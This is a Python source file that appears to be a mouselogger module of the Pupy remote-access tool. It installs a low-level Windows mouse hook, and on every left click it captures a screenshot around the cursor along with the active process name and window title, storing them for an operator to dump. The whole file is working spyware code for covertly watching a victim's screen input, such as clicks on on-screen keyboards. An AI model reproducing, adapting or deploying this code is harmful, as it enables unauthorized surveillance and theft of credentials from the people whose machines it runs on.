# Mostly stolen from Nicolas VERDIER (contact@n1nj4.eu)
# Mostly stolen and recreated by golind

import time
import datetime

from png import bmp_to_png

from hookfuncs import (
    MSG, SetTimer, GetMessageW,
    byref, KillTimer, get_mouse_xy,
    GetSystemMetrics,
    SM_CXVIRTUALSCREEN, SM_XVIRTUALSCREEN,
    SM_CYVIRTUALSCREEN, SM_YVIRTUALSCREEN,
    GetWindowDC, CreateCompatibleDC, SelectObject,
    BitBlt, SRCCOPY, BITMAPINFO, sizeof,
    BITMAPINFOHEADER, create_string_buffer,
    GetDIBits, pointer, DIB_RGB_COLORS, DeleteObject,
    HOOKPROC, SetWindowsHookEx, WH_MOUSE_LL,
    GetModuleHandleW, UnhookWindowsHookEx,
    get_current_process, CallNextHookEx, CreateCompatibleBitmap
)

import pupy

current_window = None

def mouselogger_start(event_id=None):
    if pupy.manager.active(MouseLogger):
        return False

    try:
        pupy.manager.create(MouseLogger, event_id=event_id)
    except:
        return False

    return True

def mouselogger_dump():
    mouselogger = pupy.manager.get(MouseLogger)
    if mouselogger:
        return mouselogger.results

def mouselogger_stop():
    mouselogger = pupy.manager.get(MouseLogger)
    if mouselogger:
        pupy.manager.stop(MouseLogger)
        return mouselogger.results

class MouseLogger(pupy.Task):
    def __init__(self, *args, **kwargs):
        super(MouseLogger, self).__init__(*args, **kwargs)
        self.hooked  = None
        self.pointer = None

    def task(self):
        if not self.install_hook():
            raise RuntimeError("couldn't install mouselogger")

        try:
            msg = MSG()
            timer = SetTimer(0, 0, 1000, 0)

            while self.active:
                GetMessageW(byref(msg), 0, 0, 0)

            KillTimer(0, timer)

        finally:
            self.uninstall_hook()

    def get_screenshot(self):
        x, y = get_mouse_xy()

        limit_width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
        limit_height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
        limit_left = GetSystemMetrics(SM_XVIRTUALSCREEN)
        limit_top = GetSystemMetrics(SM_YVIRTUALSCREEN)

        height = min(100,limit_height)
        width = min(200,limit_width)
        left = max(x-100,limit_left)
        top = max(y-50,limit_top)

        srcdc = GetWindowDC(0)
        memdc = CreateCompatibleDC(srcdc)
        bmp = CreateCompatibleBitmap(srcdc, width, height)
        try:
            SelectObject(memdc, bmp)
            BitBlt(memdc, 0, 0, width, height, srcdc, left, top, SRCCOPY)
            bmi = BITMAPINFO()
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
            bmi.bmiHeader.biWidth = width
            bmi.bmiHeader.biHeight = height
            bmi.bmiHeader.biBitCount = 24
            bmi.bmiHeader.biPlanes = 1
            buffer_len = height * ((width * 3 + 3) & -4)
            pixels = create_string_buffer(buffer_len)
            bits = GetDIBits(memdc, bmp, 0, height, byref(pixels),
                pointer(bmi), DIB_RGB_COLORS)
        finally:
            DeleteObject(srcdc)
            DeleteObject(memdc)
            DeleteObject(bmp)

        if bits != height or len(pixels.raw) != buffer_len:
            raise ValueError('MSSWindows: GetDIBits() failed.')

        return pixels.raw, height, width

    def install_hook(self):
        self.pointer = HOOKPROC(self.hook_proc)
        self.hooked = SetWindowsHookEx(
            WH_MOUSE_LL,
            self.pointer,
            GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False

        return True

    def uninstall_hook(self):
        if self.hooked is None:
            return

        UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def hook_proc(self, nCode, wParam, lParam):
        ##http://www.pinvoke.net/default.aspx/Constants.WM
        if wParam == 0x201:
            buf, height, width = self.get_screenshot()
            exe, win_title = "unknown", "unknown"
            try:
                exe, win_title=get_current_process()
            except Exception:
                pass

            self.append((
                str(datetime.datetime.now()), height, width, exe,
                win_title, bmp_to_png(buf, width, height, reverse=True)
            ))

        return CallNextHookEx(self.hooked, nCode, wParam, lParam)

if __name__=="__main__":
    ml = MouseLogger()
    ml.start()
    while True:
        for d, height, width, exe, win_title, buf in ml.retrieve_screenshots():
            print "screenshot of %s/%s taken at %s (%s bytes) from %s : %s "%(
                height, width, d, len(buf), exe, win_title)
        time.sleep(1)
